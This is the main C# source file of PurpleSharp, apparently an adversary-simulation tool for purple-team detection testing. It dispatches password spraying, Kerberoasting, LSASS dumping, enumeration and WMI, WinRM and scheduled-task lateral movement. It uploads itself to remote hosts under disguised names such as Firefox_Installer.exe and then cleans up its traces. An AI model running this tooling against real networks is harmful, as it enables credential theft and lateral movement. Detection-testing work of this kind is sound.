using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp
{
    class Program
    {

        static void Usage()
        {
            Console.WriteLine("\n  PurpleSharp Usage:\n");
            Console.WriteLine("\tPurpleSharp.exe /List                    -   Roast all users in current domain");
            Console.WriteLine("\tPurpleSharp.exe /T [Technique_ID]        -   Roast all users in current domain using alternate creds");
        }

        public static void Main(string[] args)
        {
            string technique, tactic, pwd, command, rhost, domain, ruser, rpwd;
            int usertype, hosttype, protocol, sleep, type, nusers, nhosts;
            sleep = 0;
            usertype = hosttype = protocol = type = 1;
            nusers = nhosts = 5;
            bool cleanup = false;
            bool opsec = false;
            technique = tactic = rhost = domain = ruser = rpwd = "";
            command = "ipconfig.exe";
            pwd = "Summer2019!";

            if (args.Length == 0)
            {
                Usage();
                return;
            }

            for (int i = 0; i < args.Length; i++)   
            {
                try
                {
                    switch (args[i])
                    {
                        case "/rhost":
                            rhost = args[i + 1];
                            break;
                        case "/ruser":
                            ruser = args[i + 1];
                            break;
                        case "/domain":
                            domain = args[i + 1];
                            break;
                        case "/rpwd":
                            rpwd = args[i + 1];
                            break;
                        case "/technique":
                            technique = args[i + 1];
                            break;
                        case "/pwd":
                            pwd = args[i + 1];
                            break;
                        case "/tactic":
                            tactic = args[i + 1];
                            break;
                        case "/users":
                            usertype = Int32.Parse(args[i + 1]);
                            break;
                        case "/hosts":
                            hosttype = Int32.Parse(args[i + 1]);
                            break;
                        case "/prot":
                            protocol = Int32.Parse(args[i + 1]);
                            break;
                        case "/sleep":
                            sleep = Int32.Parse(args[i + 1]);
                            break;
                        case "/type":
                            type = Int32.Parse(args[i + 1]);
                            break;
                        case "/command":
                            command = args[i + 1];
                            break;
                        case "/nusers":
                            nusers = Int32.Parse(args[i + 1]);
                            break;
                        case "/nhosts":
                            nhosts = Int32.Parse(args[i + 1]);
                            break;
                        case "/cleanup":
                            cleanup = true;
                            break;

                        case "/opsec":
                            opsec = true;
                            break;
                        default:
                            break;
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine("[*] Error parsing parameters :( ");
                    Console.WriteLine("[*] Exiting");
                    return;

                }
                
            }
            if (rhost == "" && opsec)
            {

                Lib.NamedPipes.RunServer("testpipe", technique, "Firefox_Installer.exe","001.dat");
                return;

            }
            if (rhost != "")
            {
                ExecuteRemote(rhost, domain, ruser, rpwd, technique, opsec);

            }
            else 
            {
                ExecuteTechnique(technique, type, usertype, nusers, hosttype, nhosts, protocol, sleep, pwd, command, cleanup);
            }
            
            
        }

        public static void ExecuteRemote(string rhost, string domain, string ruser, string rpwd, string technique, bool opsec)
        {
            if (rpwd == "")
            {
                Console.Write("Password: ");
                StringBuilder passwordBuilder = new StringBuilder();
                bool continueReading = true;
                char newLineChar = '\r';
                while (continueReading)
                {
                    ConsoleKeyInfo consoleKeyInfo = Console.ReadKey(true);
                    char passwordChar = consoleKeyInfo.KeyChar;

                    if (passwordChar == newLineChar)
                    {
                        continueReading = false;
                    }
                    else
                    {
                        passwordBuilder.Append(passwordChar.ToString());
                    }
                }
                rpwd = passwordBuilder.ToString();
            }
            Console.WriteLine();
            string uploadPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string dirpath = "C:\\Windows\\Temp\\";
            string orchestrator = "Legit.exe";
            string simulator = "Firefox_Installer.exe";
            string log = "001.dat";


            //string executionPath = "C:\\Windows\\Temp\\Legit.exe";
            Lib.RemoteLauncher.upload(uploadPath, dirpath + orchestrator, rhost, ruser, rpwd, domain);
            System.Threading.Thread.Sleep(3000);
            string cmdline = "/technique "+ technique;
            if (opsec)
            {
                cmdline = cmdline + " /opsec";
                Lib.RemoteLauncher.wmiexec(rhost, dirpath + orchestrator, cmdline, domain, ruser, rpwd);
                //Console.WriteLine("[+] Performing recon on "+rhost);
                string[] result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe").Split(',');
                string loggeduser=result[0];

                if (loggeduser == "")
                {
                    Console.WriteLine("[!] Could not identify a suitable process for the simulation. Is a user logged in on: "+rhost+"?");
                    Lib.RemoteLauncher.delete(dirpath + orchestrator, rhost, ruser, rpwd, domain);
                    Console.WriteLine("[!] Exitting.");
                    return;

                }

                Console.WriteLine("[!] Recon results: "+String.Format("Logged on user: {0} | Spoofing process: {1} | PID: {2}" ,loggeduser, result[1], result[2]));
                //Console.WriteLine("function returned with: " + result);
                string path = "C:\\Users\\" + loggeduser + "\\Downloads\\";
                //string path = "C:\\Users\\" + result + "\\Downloads\\ChromeSetup.exe";
                Lib.RemoteLauncher.upload(uploadPath, path + simulator, rhost, ruser, rpwd, domain);

                Console.WriteLine("[+] Executing Simulation...");
                //Console.WriteLine("[+] Sending stop command...");
                Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", true);

                System.Threading.Thread.Sleep(3000);
                Console.WriteLine("[+] Cleaning up...");
                Lib.RemoteLauncher.delete(dirpath + orchestrator, rhost, ruser, rpwd, domain);
                Lib.RemoteLauncher.delete(dirpath + log, rhost, ruser, rpwd, domain);
                Lib.RemoteLauncher.delete(path + simulator, rhost, ruser, rpwd, domain);
                Console.WriteLine("[+] Obtaining simulation results...");
                string results = Lib.RemoteLauncher.readFile(rhost, path + log, ruser, rpwd, domain);
                Console.WriteLine("[+] Results:");
                Console.WriteLine();
                Console.WriteLine(results);
                Lib.RemoteLauncher.delete(path + log, rhost, ruser, rpwd, domain);
            }
            else 
            {
                Lib.RemoteLauncher.wmiexec(rhost, dirpath + orchestrator, cmdline, domain, ruser, rpwd);
                System.Threading.Thread.Sleep(3000);
                Console.WriteLine("[+] Obtaining results...");
                string results = Lib.RemoteLauncher.readFile(rhost, dirpath + log, ruser, rpwd, domain);
                Console.WriteLine("[+] Results:");
                Console.WriteLine();
                Console.WriteLine(results);
                Console.WriteLine("[+] Cleaning up...");
                Lib.RemoteLauncher.delete(dirpath + orchestrator, rhost, ruser, rpwd, domain);
                Lib.RemoteLauncher.delete(dirpath + log, rhost, ruser, rpwd, domain);
            }
            


        }

        public static void ExecuteTechnique(string technique, int type, int usertype, int nuser, int computertype, int nhosts, int protocol, int sleep, string password, string command, bool cleanup)
        {
            switch (technique)
            {
                //T1110 - Brute Force
                case "T1110":
                    if (type == 1)
                    {
                        Simulations.CredAccess.LocalDomainPasswordSpray(usertype, nuser, protocol, sleep, password);
                        break;
                    }
                    else if ( type == 2)
                    {
                        Simulations.CredAccess.RemotePasswordSpray(type, computertype, nhosts, usertype, nuser, protocol, sleep, password);
                        break;
                    }
                    break;

                case "localspray":
                //T1110 - Brute Force
                    Simulations.CredAccess.LocalDomainPasswordSpray(usertype, nuser, protocol, sleep, password);
                    break;

                //T1110 - Brute Force    
                case "networkspray":
                    Simulations.CredAccess.RemotePasswordSpray(type, computertype, nhosts, usertype, nuser, protocol, sleep, password);
                    break;

                //T1208 - Kerberoasting
                case "kerberoast": case "T1208":
                    Simulations.CredAccess.Kerberoasting(sleep);
                    break;

                //T1135 - Network Share Discovery
                case "shareenum":
                case "T1135":
                    Simulations.Discovery.EnumerateShares(computertype, nhosts, sleep);
                    break;

                case "privenum":
                    Simulations.Discovery.PrivilegeEnumeration(computertype, nhosts, sleep);
                    break;

                //T1003 - Credential Dumping
                case "lsassdump":
                case "T1003":
                    
                    Simulations.CredAccess.Lsass();
                    break;

                //T1021 - Remote Service
                case "remoteservice":
                case "T1021":
                    
                    Simulations.LateralMovement.CreateRemoteServiceOnHosts(computertype, nhosts, sleep, cleanup);
                    break;

                //T1028 - Windows Remote Management
                case "wmiexec":
                    Simulations.LateralMovement.ExecuteWmiOnHosts(computertype, nhosts, sleep, command);
                    break;

                //T1053 - Scheduled Task
                case "atexec":
                case "T1053":
                    Simulations.LateralMovement.CreateSchTaskOnHosts(computertype, nhosts, sleep, command, cleanup);
                    break;

                //T1028 - Windows Remote Management
                case "winrmexec":
                case "T1028":
                    Simulations.LateralMovement.ExecuteWinRMOnHosts(computertype, nhosts, sleep, command);
                    break;

                //T1423 - Network Service Scanning
                case "portscan":
                case "T1423":
                    Simulations.Discovery.NetworkServiceDiscovery(computertype, nhosts, sleep);
                    break;

                case "T1086":
                    Simulations.Execution.ExecutePowershell();
                    break;

                case "T1117":
                    Simulations.Execution.ExecuteRegsvr32();
                    break;

                case "T1136":
                    Simulations.Persistence.CreateAccountCmd();
                    break;

                case "T1087":
                    Simulations.Discovery.AccountDiscovery();
                    break;

                default:
                    break;

            }
        }

    }

}
